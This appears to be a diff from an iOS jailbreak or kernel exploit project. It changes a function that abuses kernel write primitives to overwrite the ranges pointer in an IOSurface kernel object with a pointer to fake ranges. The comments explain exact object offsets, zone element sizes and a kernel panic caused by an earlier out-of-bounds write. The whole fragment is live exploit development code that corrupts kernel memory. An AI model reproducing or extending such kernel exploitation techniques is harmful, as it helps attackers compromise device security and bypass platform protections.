@@ -229,17 +229,17 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		cleanups[cleanupsCount-1].descriptor = desc;
 		cleanups[cleanupsCount-1].origRanges = ranges;
 		cleanups[cleanupsCount-1].fakeRangesUA = fakeRanges;
-		// v79: the IOSurface KERNEL OBJECT carries its own copies —
-		// IOSurface.ranges@0x360, rangeCount@0x3a4 (KPF table). v78 proved
-		// GetBaseAddress ignores the descriptor-only retarget; the mapper
-		// likely reads the surface's copy. Rewrite both (large objects,
-		// RMW-safe).
+		// v80: the IOSurface KERNEL OBJECT carries its own ranges copy —
+		// IOSurface.ranges@0x360 (KPF table). RMW LAW v2: the 32-byte
+		// primitive window must stay INSIDE the object — the IOSurface zone
+		// element is 960 bytes (0x3c0, proven by the 23:38:04 panic where
+		// kwrite32 at rangeCount@0x3a4 overran its end by 4 bytes). 0x360's
+		// window ends at 0x380 — safe. rangeCount is NOT writable by
+		// primitive and is assumed 1 (single-range surface, matches desc).
 		kwrite64(surface + 0x360, fakeRanges_kva);
-		kwrite32(surface + 0x3a4, 1);
-		jb_tr_beacon("KMAP rb,surface,r360=%llx,expect=%llx,rc3a4=%x",
+		jb_tr_beacon("KMAP rb,surface,r360=%llx,expect=%llx",
 		             (unsigned long long)kread64(surface + 0x360),
-		             (unsigned long long)fakeRanges_kva,
-		             (unsigned int)kread32(surface + 0x3a4));
+		             (unsigned long long)fakeRanges_kva);
 	}
 	else {
 		// v75 NOTE: this branch (minsafe<=0x10) writes the 16-byte ranges
